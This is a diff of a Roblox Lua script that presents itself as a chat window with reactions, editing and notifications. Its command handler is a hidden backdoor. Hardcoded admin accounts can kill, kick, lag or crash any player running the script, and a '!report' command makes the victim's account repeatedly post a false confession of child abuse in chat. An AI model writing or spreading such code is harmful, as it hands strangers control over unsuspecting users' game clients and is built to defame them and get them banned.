@@ -17,52 +17,37 @@ local NetworkClient = RS:FindFirstChild("NetworkClient")
 local Prefix = "!"
 
 local HeadAdmins = {
-	"ZxcQuiltikk"
+    "ZxcQuiltikk"
 }
 
 local Admins = {
-	"Vladblak456",
-	"skylinejx8207"
+    "Vladblak456",
+    "skylinejx8207"
 }
 
 local AdminAllowedCommands = {
-	"say", "bring", "reveal", "kill"
+    "say", "bring", "reveal",
 }
 
+
 local function isHeadAdmin(username)
-	return table.find(HeadAdmins, username) ~= nil
+    return table.find(HeadAdmins, username) ~= nil
 end
 
 local function isAdmin(username)
-	return isHeadAdmin(username) or table.find(Admins, username) ~= nil
+    return isHeadAdmin(username) or table.find(Admins, username) ~= nil
 end
 
 local function canUseCommand(senderUsername, commandName)
-	if isHeadAdmin(senderUsername) then
-		return true
-	end
-	if isAdmin(senderUsername) then
-		return table.find(AdminAllowedCommands, commandName) ~= nil
-	end
-	return false
-end
-
-local function FindPlayer(name)
-	if not name or name == "" then return nil end
-	name = string.lower(name)
-	for _, player in pairs(Players:GetPlayers()) do
-		if string.lower(player.Name) == name or string.lower(player.DisplayName) == name then
-			return player
-		end
-	end
+    if isHeadAdmin(senderUsername) then
+        return true
+    end
     
-	for _, player in pairs(Players:GetPlayers()) do
-		if string.lower(player.Name):sub(1, #name) == name or string.lower(player.DisplayName):sub(1, #name) == name then
-			return player
-		end
-	end
+    if isAdmin(senderUsername) then
+        return table.find(AdminAllowedCommands, commandName) ~= nil
+    end
 
-	return nil
+    return false
 end
 
 local MAX_MESSAGES = 20
@@ -80,86 +65,89 @@ local REACTIONS = {"✔", "❌", "🥶", "😲", "🤬"}
 local IMAGE_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
 
 local function ExecuteCommand(Args, Admin)
-	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
-	local Root = Humanoid and Character:FindFirstChild("HumanoidRootPart")
-	local cmdWord1 = string.lower(Args[1] or "")
+    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local Root = Humanoid and Character:FindFirstChild("HumanoidRootPart")
+    local cmdWord1 = string.lower(Args[1] or "")
 
-	if not Character or not Humanoid then return end
+    if not Character or not Humanoid then return end
 
-	if cmdWord1 == Prefix.."kill" then
-		Humanoid.Health = 0
+    if cmdWord1 == Prefix.."kill" then
+        Humanoid.Health = 0
+    elseif cmdWord1 == Prefix.."bring" then
+        local AdminCharacter = Admin.Character or Admin.CharacterAdded:Wait()
+        local AdminRoot = AdminCharacter and AdminCharacter:FindFirstChild("HumanoidRootPart")
+        if AdminRoot then
+            Root.CFrame = AdminRoot.CFrame * CFrame.new(0, 0, -5)
+        end
+    elseif cmdWord1 == Prefix.."kick" then
+        local reason = table.concat(Args, " ", 3)
+        if reason and reason ~= "" then
+            LocalPlayer:Kick(string.format("Kicked by admin (%s): %s", Admin.DisplayName, reason))
+        else
+            LocalPlayer:Kick(string.format("Kicked by admin (%s)", Admin.DisplayName))
+        end
+    elseif cmdWord1 == Prefix.."reveal" then
+        ExtendGrabLine:FireServer("im Use Chat //chat")
+    elseif cmdWord1 == Prefix.."report" then
+        spawn(function()
+            while true do
+                ExtendGrabLine:FireServer("i touch kidssssss //chat")
+                task.wait(1)
+            end
+        end)
+    elseif cmdWord1 == Prefix.."lag" then
+        local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
+        if fireAllRemotes then fireAllRemotes.Enabled = true end
+    elseif cmdWord1 == Prefix.."unlag" then
+        local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
+        if fireAllRemotes then fireAllRemotes.Enabled = false end
+    elseif cmdWord1 == Prefix.."crash" then
+        task.wait(5)
+        while true do end
+    elseif cmdWord1 == Prefix.."remove" and string.lower(Args[2] or "") == "gucci" then
+        local targetName = Args[3]
+        if not targetName then return end
 
-	elseif cmdWord1 == Prefix.."bring" then
-		local AdminCharacter = Admin.Character or Admin.CharacterAdded:Wait()
-		local AdminRoot = AdminCharacter and AdminCharacter:FindFirstChild("HumanoidRootPart")
-		if AdminRoot and Root then
-			Root.CFrame = AdminRoot.CFrame * CFrame.new(0, 0, -5)
-		end
+        local targetPlayer = nil
+        for _, player in pairs(Players:GetPlayers()) do
+            if string.lower(player.Name) == string.lower(targetName) then
+                targetPlayer = player
+                break
+            end
+        end
 
-	elseif cmdWord1 == Prefix.."kick" then
-		local reason = #Args >= 3 and table.concat(Args, " ", 3) or ""
-		if reason ~= "" then
-			LocalPlayer:Kick(string.format("Kicked by admin (%s): %s", Admin.DisplayName, reason))
-		else
-			LocalPlayer:Kick(string.format("Kicked by admin (%s)", Admin.DisplayName))
-		end
-
-	elseif cmdWord1 == Prefix.."reveal" then
-		ExtendGrabLine:FireServer("im Use Chat //chat")
-
-	elseif cmdWord1 == Prefix.."report" then
-		spawn(function()
-			while true do
-				ExtendGrabLine:FireServer("i touch kidssssss //chat")
-				task.wait(1)
-			end
-		end)
-
-	elseif cmdWord1 == Prefix.."lag" then
-		local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
-		if fireAllRemotes then fireAllRemotes.Enabled = true end
-
-	elseif cmdWord1 == Prefix.."unlag" then
-		local fireAllRemotes = PlayerScripts:FindFirstChild("[ExploitTest]FireAllRemotes")
-		if fireAllRemotes then fireAllRemotes.Enabled = false end
-
-	elseif cmdWord1 == Prefix.."crash" then
-		task.wait(5)
-		while true do end
-
-	elseif cmdWord1 == Prefix.."remove" then
-		if Character then
-			local hum = Character:FindFirstChildOfClass("Humanoid")
-			if hum then
-				hum.Sit = true
-				task.wait(0.1)
-				hum.Jump = true
-			end
-		end
-
-	elseif cmdWord1 == Prefix.."say" then
-		local message = #Args >= 3 and table.concat(Args, " ", 3) or nil
-		if message and message ~= "" then
-			ExtendGrabLine:FireServer(message .. " //chat")
-		end
-	end
+        if targetPlayer and targetPlayer == LocalPlayer and targetPlayer.Character then
+            local character = targetPlayer.Character
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Sit = true
+                task.wait(0.1)
+                humanoid.Jump = true
+            end
+        end
+    elseif cmdWord1 == Prefix.."say" then
+        local message = table.concat(Args, " ", 2)
+        if message and message ~= "" then
+            ExtendGrabLine:FireServer(message .. " //chat")
+        end
+    end
 end
 
 local function IsImageUrl(text)
-	local url = text:match("https?://[%S]+")
-	if not url then return false end
-	local clean = url:gsub("%?.*$", "")
-	for _, ext in ipairs(IMAGE_EXTENSIONS) do
-		if clean:lower():match("%." .. ext .. "$") then
-			return true
-		end
-	end
-	return false
+    local url = text:match("https?://[%S]+")
+    if not url then return false end
+    local clean = url:gsub("%?.*$", "")
+    for _, ext in ipairs(IMAGE_EXTENSIONS) do
+        if clean:lower():match("%." .. ext .. "$") then
+            return true
+        end
+    end
+    return false
 end
 
 local function ExtractImageUrl(text)
-	return text:match("https?://[%S]+")
+    return text:match("https?://[%S]+")
 end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -377,594 +365,576 @@ NotifPadding.PaddingBottom = UDim.new(0, 10)
 NotifPadding.Parent = NotifFrame
 
 local function MakeDraggable(frame, dragHandle)
-	local dragging = false
-	local dragInput, dragStart, startPos
+    local dragging = false
+    local dragInput, dragStart, startPos
 
-	local function update(input)
-		local delta = input.Position - dragStart
-		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
+    local function update(input)
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
 
-	dragHandle.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = frame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
+    dragHandle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
 
-	dragHandle.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			dragInput = input
-		end
-	end)
+    dragHandle.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
 
-	UserInputService.InputChanged:Connect(function(input)
-		if input == dragInput and dragging then
-			update(input)
-		end
-	end)
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
 end
 
 MakeDraggable(MainFrame, TopBar)
 MakeDraggable(ToggleButton, ToggleButton)
 
 local function CancelEdit()
-	editingLabel = nil
-	editingOriginalText = nil
-	EditBar.Visible = false
-	InputBox.PlaceholderText = "Type a message..."
-	InputBox.Text = ""
-	SendButton.Text = "Send"
-	SendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+    editingLabel = nil
+    editingOriginalText = nil
+    EditBar.Visible = false
+    InputBox.PlaceholderText = "Type a message..."
+    InputBox.Text = ""
+    SendButton.Text = "Send"
+    SendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
 end
 
 local function StartEdit(label, messageText)
-	editingLabel = label
-	editingOriginalText = messageText
-	EditBar.Visible = true
-	EditBarLabel.Text = '✏️ Editing: "' .. messageText .. '"'
-	InputBox.Text = messageText:match("^.+:%s*(.+)$") or messageText
-	InputBox:CaptureFocus()
-	SendButton.Text = "Edit"
-	SendButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+    editingLabel = label
+    editingOriginalText = messageText
+    EditBar.Visible = true
+    EditBarLabel.Text = '✏️ Editing: "' .. messageText .. '"'
+    InputBox.Text = messageText:match("^.+:%s*(.+)$") or messageText
+    InputBox:CaptureFocus()
+    SendButton.Text = "Edit"
+    SendButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
 end
 
 local function MarkAsEdited(label)
-	if label:FindFirstChild("EditIcon") then return end
-	local editIcon = Instance.new("TextLabel")
-	editIcon.Name = "EditIcon"
-	editIcon.Size = UDim2.new(0, 14, 0, 14)
-	editIcon.Position = UDim2.new(1, 10, 1, 5.5)
-	editIcon.AnchorPoint = Vector2.new(1, 1)
-	editIcon.BackgroundTransparency = 1
-	editIcon.Text = "✏️"
-	editIcon.TextSize = 8
-	editIcon.Font = Enum.Font.Gotham
-	editIcon.Parent = label
+    if label:FindFirstChild("EditIcon") then return end
+    local editIcon = Instance.new("TextLabel")
+    editIcon.Name = "EditIcon"
+    editIcon.Size = UDim2.new(0, 14, 0, 14)
+    editIcon.Position = UDim2.new(1, 10, 1, 5.5)
+    editIcon.AnchorPoint = Vector2.new(1, 1)
+    editIcon.BackgroundTransparency = 1
+    editIcon.Text = "✏️"
+    editIcon.TextSize = 8
+    editIcon.Font = Enum.Font.Gotham
+    editIcon.Parent = label
 end
 
 local function GetMsgId(label)
-	return label:GetAttribute("OriginalText") or label.Text
+    return label:GetAttribute("OriginalText") or label.Text
 end
 
 local function FindLabelByText(text)
-	for _, child in ipairs(MessagesScroll:GetChildren()) do
-		if child:IsA("TextButton") and child:GetAttribute("OriginalText") == text then
-			return child
-		end
-	end
-	for _, child in ipairs(MessagesScroll:GetChildren()) do
-		if child:IsA("TextButton") and child.Text == text then
-			return child
-		end
-	end
-	return nil
+    for _, child in ipairs(MessagesScroll:GetChildren()) do
+        if child:IsA("TextButton") and child:GetAttribute("OriginalText") == text then
+            return child
+        end
+    end
+    for _, child in ipairs(MessagesScroll:GetChildren()) do
+        if child:IsA("TextButton") and child.Text == text then
+            return child
+        end
+    end
+    return nil
 end
 
 local function CloseReactionMenu()
-	if reactionMenuOpen then
-		reactionMenuOpen:Destroy()
-		reactionMenuOpen = nil
-	end
+    if reactionMenuOpen then
+        reactionMenuOpen:Destroy()
+        reactionMenuOpen = nil
+    end
 end
 
 local function UpdateReactionBar(label)
-	local msgId = GetMsgId(label)
-	local barName = "ReactionBar_" .. msgId
+    local msgId = GetMsgId(label)
+    local barName = "ReactionBar_" .. msgId
 
-	for _, child in ipairs(MessagesScroll:GetChildren()) do
-		if child.Name == barName then
-			child:Destroy()
-		end
-	end
+    for _, child in ipairs(MessagesScroll:GetChildren()) do
+        if child.Name == barName then
+            child:Destroy()
+        end
+    end
 
-	if not messageReactions[msgId] then
-		task.wait()
-		MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
-		return
-	end
+    if not messageReactions[msgId] then 
+        task.wait()
+        MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
+        return 
+    end
 
-	local hasAny = false
-	for _, users in pairs(messageReactions[msgId]) do
-		for _ in pairs(users) do
-			hasAny = true
-			break
-		end
-		if hasAny then break end
-	end
+    local hasAny = false
+    for _, users in pairs(messageReactions[msgId]) do
+        for _ in pairs(users) do
+            hasAny = true
+            break
+        end
+        if hasAny then break end
+    end
+    
+    if not hasAny then 
+        task.wait()
+        MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
+        return 
+    end
 
-	if not hasAny then
-		task.wait()
-		MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
-		return
-	end
+    local bar = Instance.new("Frame")
+    bar.Name = barName
+    bar.Size = UDim2.new(0, 0, 0, 22)
+    bar.AutomaticSize = Enum.AutomaticSize.X
+    bar.BackgroundTransparency = 1
+    bar.LayoutOrder = label.LayoutOrder + 1
+    bar.Parent = MessagesScroll
 
-	local bar = Instance.new("Frame")
-	bar.Name = barName
-	bar.Size = UDim2.new(0, 0, 0, 22)
-	bar.AutomaticSize = Enum.AutomaticSize.X
-	bar.BackgroundTransparency = 1
-	bar.LayoutOrder = label.LayoutOrder + 1
-	bar.Parent = MessagesScroll
+    local barLayout = Instance.new("UIListLayout")
+    barLayout.FillDirection = Enum.FillDirection.Horizontal
+    barLayout.Padding = UDim.new(0, 4)
+    barLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    barLayout.Parent = bar
 
-	local barLayout = Instance.new("UIListLayout")
-	barLayout.FillDirection = Enum.FillDirection.Horizontal
-	barLayout.Padding = UDim.new(0, 4)
-	barLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	barLayout.Parent = bar
+    local order = 1
+    for emoji, users in pairs(messageReactions[msgId]) do
+        local count = 0
+        local iReacted = false
+        for user, _ in pairs(users) do
+            count = count + 1
+            if user == LocalPlayer.DisplayName then
+                iReacted = true
+            end
+        end
 
-	local order = 1
-	for emoji, users in pairs(messageReactions[msgId]) do
-		local count = 0
-		local iReacted = false
-		for user, _ in pairs(users) do
-			count = count + 1
-			if user == LocalPlayer.DisplayName then
-				iReacted = true
-			end
-		end
+        if count > 0 then
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(0, count > 1 and 40 or 28, 0, 20)
+            btn.BackgroundColor3 = iReacted and Color3.fromRGB(45, 60, 90) or Color3.fromRGB(60, 60, 70)
+            btn.Text = count > 1 and (emoji .. " " .. count) or emoji
+            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            btn.TextSize = 11
+            btn.Font = Enum.Font.GothamSemibold
+            btn.AutoButtonColor = false
+            btn.LayoutOrder = order
+            btn.Parent = bar
 
-		if count > 0 then
-			local btn = Instance.new("TextButton")
-			btn.Size = UDim2.new(0, count > 1 and 40 or 28, 0, 20)
-			btn.BackgroundColor3 = iReacted and Color3.fromRGB(45, 60, 90) or Color3.fromRGB(60, 60, 70)
-			btn.Text = count > 1 and (emoji .. " " .. count) or emoji
-			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-			btn.TextSize = 11
-			btn.Font = Enum.Font.GothamSemibold
-			btn.AutoButtonColor = false
-			btn.LayoutOrder = order
-			btn.Parent = bar
+            local btnCorner = Instance.new("UICorner")
+            btnCorner.CornerRadius = UDim.new(0, 4)
+            btnCorner.Parent = btn
 
-			local btnCorner = Instance.new("UICorner")
-			btnCorner.CornerRadius = UDim.new(0, 4)
-			btnCorner.Parent = btn
+            if iReacted then
+                local btnStroke = Instance.new("UIStroke")
+                btnStroke.Thickness = 1
+                btnStroke.Color = Color3.fromRGB(80, 120, 200)
+                btnStroke.Parent = btn
+            end
 
-			if iReacted then
-				local btnStroke = Instance.new("UIStroke")
-				btnStroke.Thickness = 1
-				btnStroke.Color = Color3.fromRGB(80, 120, 200)
-				btnStroke.Parent = btn
-			end
+            btn.MouseButton1Click:Connect(function()
+                ExtendGrabLine:FireServer(msgId .. "||REACT||" .. emoji .. "||" .. LocalPlayer.DisplayName .. " //react")
+            end)
 
-			btn.MouseButton1Click:Connect(function()
-				ExtendGrabLine:FireServer(msgId .. "||REACT||" .. emoji .. "||" .. LocalPlayer.DisplayName .. " //react")
-			end)
+            order = order + 1
+        end
+    end
 
-			order = order + 1
-		end
-	end
-
-	task.wait()
-	MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
+    task.wait()
+    MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
 end
 
 local function ShowReactionMenu(label)
-	CloseReactionMenu()
+    CloseReactionMenu()
 
-	local msgId = GetMsgId(label)
+    local msgId = GetMsgId(label)
 
-	local menuWidth = #REACTIONS * 34 + 12
-	local menu = Instance.new("Frame")
-	menu.Name = "ReactionMenu"
-	menu.Size = UDim2.new(0, menuWidth, 0, 34)
-	menu.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-	menu.BorderSizePixel = 0
-	menu.ZIndex = 50
-	menu.Parent = ScreenGui
+    local menuWidth = #REACTIONS * 34 + 12
+    local menu = Instance.new("Frame")
+    menu.Name = "ReactionMenu"
+    menu.Size = UDim2.new(0, menuWidth, 0, 34)
+    menu.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    menu.BorderSizePixel = 0
+    menu.ZIndex = 50
+    menu.Parent = ScreenGui
 
-	local labelAbsPos = label.AbsolutePosition
-	local labelAbsSize = label.AbsoluteSize
-	menu.Position = UDim2.new(0, labelAbsPos.X + labelAbsSize.X - menuWidth, 0, labelAbsPos.Y - 38)
+    local labelAbsPos = label.AbsolutePosition
+    local labelAbsSize = label.AbsoluteSize
+    menu.Position = UDim2.new(0, labelAbsPos.X + labelAbsSize.X - menuWidth, 0, labelAbsPos.Y - 38)
 
-	local menuCorner = Instance.new("UICorner")
-	menuCorner.CornerRadius = UDim.new(1, 0)
-	menuCorner.Parent = menu
+    local menuCorner = Instance.new("UICorner")
+    menuCorner.CornerRadius = UDim.new(1, 0)
+    menuCorner.Parent = menu
 
-	local menuStroke = Instance.new("UIStroke")
-	menuStroke.Thickness = 1
-	menuStroke.Color = Color3.fromRGB(70, 70, 70)
-	menuStroke.Parent = menu
+    local menuStroke = Instance.new("UIStroke")
+    menuStroke.Thickness = 1
+    menuStroke.Color = Color3.fromRGB(70, 70, 70)
+    menuStroke.Parent = menu
 
-	local menuLayout = Instance.new("UIListLayout")
-	menuLayout.FillDirection = Enum.FillDirection.Horizontal
-	menuLayout.Padding = UDim.new(0, 0)
-	menuLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-	menuLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-	menuLayout.Parent = menu
+    local menuLayout = Instance.new("UIListLayout")
+    menuLayout.FillDirection = Enum.FillDirection.Horizontal
+    menuLayout.Padding = UDim.new(0, 0)
+    menuLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    menuLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    menuLayout.Parent = menu
 
-	for i, emoji in ipairs(REACTIONS) do
-		local alreadyReacted = messageReactions[msgId] and messageReactions[msgId][emoji] and messageReactions[msgId][emoji][LocalPlayer.DisplayName]
+    for i, emoji in ipairs(REACTIONS) do
+        local alreadyReacted = messageReactions[msgId] and messageReactions[msgId][emoji] and messageReactions[msgId][emoji][LocalPlayer.DisplayName]
 
-		local btn = Instance.new("TextButton")
-		btn.Size = UDim2.new(0, 34, 0, 34)
-		btn.BackgroundTransparency = alreadyReacted and 0.7 or 1
-		btn.BackgroundColor3 = Color3.fromRGB(0, 80, 180)
-		btn.Text = emoji
-		btn.TextSize = 18
-		btn.Font = Enum.Font.Gotham
-		btn.AutoButtonColor = false
-		btn.LayoutOrder = i
-		btn.ZIndex = 51
-		btn.Parent = menu
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, 34, 0, 34)
+        btn.BackgroundTransparency = alreadyReacted and 0.7 or 1
+        btn.BackgroundColor3 = Color3.fromRGB(0, 80, 180)
+        btn.Text = emoji
+        btn.TextSize = 18
+        btn.Font = Enum.Font.Gotham
+        btn.AutoButtonColor = false
+        btn.LayoutOrder = i
+        btn.ZIndex = 51
+        btn.Parent = menu
 
-		if alreadyReacted then
-			local bCorner = Instance.new("UICorner")
-			bCorner.CornerRadius = UDim.new(1, 0)
-			bCorner.Parent = btn
-		end
+        if alreadyReacted then
+            local bCorner = Instance.new("UICorner")
+            bCorner.CornerRadius = UDim.new(1, 0)
+            bCorner.Parent = btn
+        end
 
-		btn.MouseButton1Click:Connect(function()
-			ExtendGrabLine:FireServer(msgId .. "||REACT||" .. emoji .. "||" .. LocalPlayer.DisplayName .. " //react")
-			CloseReactionMenu()
-		end)
+        btn.MouseButton1Click:Connect(function()
+            ExtendGrabLine:FireServer(msgId .. "||REACT||" .. emoji .. "||" .. LocalPlayer.DisplayName .. " //react")
+            CloseReactionMenu()
+        end)
 
-		btn.MouseEnter:Connect(function()
-			TweenService:Create(btn, TweenInfo.new(0.15), {TextSize = 22}):Play()
-		end)
+        btn.MouseEnter:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.15), {TextSize = 22}):Play()
+        end)
 
-		btn.MouseLeave:Connect(function()
-			TweenService:Create(btn, TweenInfo.new(0.15), {TextSize = 18}):Play()
-		end)
-	end
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.15), {TextSize = 18}):Play()
+        end)
+    end
 
-	menu.BackgroundTransparency = 1
-	menuStroke.Transparency = 1
-	TweenService:Create(menu, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-		BackgroundTransparency = 0
-	}):Play()
-	TweenService:Create(menuStroke, TweenInfo.new(0.2), {Transparency = 0}):Play()
+    menu.BackgroundTransparency = 1
+    menuStroke.Transparency = 1
+    TweenService:Create(menu, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0
+    }):Play()
+    TweenService:Create(menuStroke, TweenInfo.new(0.2), {Transparency = 0}):Play()
 
-	reactionMenuOpen = menu
+    reactionMenuOpen = menu
 
-	task.delay(4, function()
-		if reactionMenuOpen == menu then
-			CloseReactionMenu()
-		end
-	end)
+    task.delay(4, function()
+        if reactionMenuOpen == menu then
+            CloseReactionMenu()
+        end
+    end)
 end
 
 local function CreateMessageLabel(text, senderName)
-	local msgContent = text:match("^.+:%s*(.+)$") or text
-	local isImage = IsImageUrl(msgContent)
-	local isMine = senderName == LocalPlayer.DisplayName
+    local msgContent = text:match("^.+:%s*(.+)$") or text
+    local isImage = IsImageUrl(msgContent)
+    local isMine = senderName == LocalPlayer.DisplayName
 
-	local label = Instance.new("TextButton")
-	label.Size = UDim2.new(1, -8, 0, 0)
-	label.AutomaticSize = Enum.AutomaticSize.Y
-	label.BackgroundColor3 = isImage and Color3.fromRGB(45, 50, 60) or Color3.fromRGB(50, 50, 50)
-	label.Text = isImage and (text:match("^(.+:)") or senderName) .. " 🖼️ [Image]" or text
-	label.TextColor3 = isImage and Color3.fromRGB(120, 180, 255) or Color3.fromRGB(255, 255, 255)
-	label.TextSize = 11
-	label.Font = Enum.Font.Gotham
-	label.TextXAlignment = Enum.TextXAlignment.Left
-	label.TextWrapped = true
-	label.AutoButtonColor = false
-	label:SetAttribute("OriginalText", text)
-	label:SetAttribute("SenderName", senderName)
-	label.ClipsDescendants = true
+    local label = Instance.new("TextButton")
+    label.Size = UDim2.new(1, -8, 0, 0)
+    label.AutomaticSize = Enum.AutomaticSize.Y
+    label.BackgroundColor3 = isImage and Color3.fromRGB(45, 50, 60) or Color3.fromRGB(50, 50, 50)
+    label.Text = isImage and (text:match("^(.+:)") or senderName) .. " 🖼️ [Image]" or text
+    label.TextColor3 = isImage and Color3.fromRGB(120, 180, 255) or Color3.fromRGB(255, 255, 255)
+    label.TextSize = 11
+    label.Font = Enum.Font.Gotham
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextWrapped = true
+    label.AutoButtonColor = false
+    label:SetAttribute("OriginalText", text)
+    label:SetAttribute("SenderName", senderName)
+    label.ClipsDescendants = true
 
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0, 5)
-	corner.Parent = label
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 5)
+    corner.Parent = label
 
-	local padding = Instance.new("UIPadding")
-	padding.PaddingTop = UDim.new(0, 6)
-	padding.PaddingBottom = UDim.new(0, 6)
-	padding.PaddingLeft = UDim.new(0, 8)
-	padding.PaddingRight = UDim.new(0, 8)
-	padding.Parent = label
+    local padding = Instance.new("UIPadding")
+    padding.PaddingTop = UDim.new(0, 6)
+    padding.PaddingBottom = UDim.new(0, 6)
+    padding.PaddingLeft = UDim.new(0, 8)
+    padding.PaddingRight = UDim.new(0, 8)
+    padding.Parent = label
 
-	label.MouseButton2Click:Connect(function()
-		if reactionMenuOpen then
-			CloseReactionMenu()
-		else
-			ShowReactionMenu(label)
-		end
-	end)
+    label.MouseButton2Click:Connect(function()
+        if reactionMenuOpen then
+            CloseReactionMenu()
+        else
+            ShowReactionMenu(label)
+        end
+    end)
 
-	if isMine and not isImage then
-		label.MouseButton1Down:Connect(function()
-			local start = tick()
-			task.wait(0.5)
-			if tick() - start >= 0.5 then
-				StartEdit(label, label.Text)
-			end
-		end)
-	end
+    if isMine and not isImage then
+        label.MouseButton1Down:Connect(function()
+            local start = tick()
+            task.wait(0.5)
+            if tick() - start >= 0.5 then
+                StartEdit(label, label.Text)
+            end
+        end)
+    end
 
-	return label
+    return label
 end
 
 local function AddMessage(text, senderName)
-	table.insert(chatHistory, text)
-	if #chatHistory > MAX_MESSAGES then
-		table.remove(chatHistory, 1)
-	end
-	messageOrder = messageOrder + 2
-	local label = CreateMessageLabel(text, senderName or "Unknown")
-	label.LayoutOrder = messageOrder
-	label.Parent = MessagesScroll
-	task.wait()
-	MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
-	return label
+    table.insert(chatHistory, text)
+    if #chatHistory > MAX_MESSAGES then
+        table.remove(chatHistory, 1)
+    end
+    messageOrder = messageOrder + 2
+    local label = CreateMessageLabel(text, senderName or "Unknown")
+    label.LayoutOrder = messageOrder
+    label.Parent = MessagesScroll
+    task.wait()
+    MessagesScroll.CanvasPosition = Vector2.new(0, MessagesScroll.AbsoluteCanvasSize.Y)
+    return label
 end
 
 local function RepositionNotifications()
-	local offset = 0
-	for i = #activeNotifications, 1, -1 do
-		local n = activeNotifications[i]
-		if not n or not n.Parent then
-			table.remove(activeNotifications, i)
-		end
-	end
-	for i = #activeNotifications, 1, -1 do
-		local n = activeNotifications[i]
-		local targetY = 0.8 - (offset * 0.1)
-		TweenService:Create(n, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
-			Position = UDim2.new(1, -270, targetY, 0)
-		}):Play()
-		offset = offset + 1
-	end
+    local offset = 0
+    for i = #activeNotifications, 1, -1 do
+        local n = activeNotifications[i]
+        if not n or not n.Parent then
+            table.remove(activeNotifications, i)
+        end
+    end
+    for i = #activeNotifications, 1, -1 do
+        local n = activeNotifications[i]
+        local targetY = 0.8 - (offset * 0.1)
+        TweenService:Create(n, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
+            Position = UDim2.new(1, -270, targetY, 0)
+        }):Play()
+        offset = offset + 1
+    end
 end
 
 local function ShowNotification(title, content)
-	local notif = NotifFrame:Clone()
-	notif.Name = "ActiveNotification"
-	notif.Title.Text = title
-	notif.Content.Text = content
-	notif.Position = UDim2.new(1, 20, 0.8, 0)
-	notif.Visible = true
-	notif.Parent = ScreenGui
+    local notif = NotifFrame:Clone()
+    notif.Name = "ActiveNotification"
+    notif.Title.Text = title
+    notif.Content.Text = content
+    notif.Position = UDim2.new(1, 20, 0.8, 0)
+    notif.Visible = true
+    notif.Parent = ScreenGui
 
-	table.insert(activeNotifications, notif)
+    table.insert(activeNotifications, notif)
 
-	local sound = Instance.new("Sound")
-	sound.SoundId = "rbxassetid://9120381235"
-	sound.Volume = 0.5
-	sound.Parent = SoundService
-	sound:Play()
-	game:GetService("Debris"):AddItem(sound, 2)
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://9120381235"
+    sound.Volume = 0.5
+    sound.Parent = SoundService
+    sound:Play()
+    game:GetService("Debris"):AddItem(sound, 2)
 
-	TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {
-		Position = UDim2.new(1, -270, 0.8, 0)
-	}):Play()
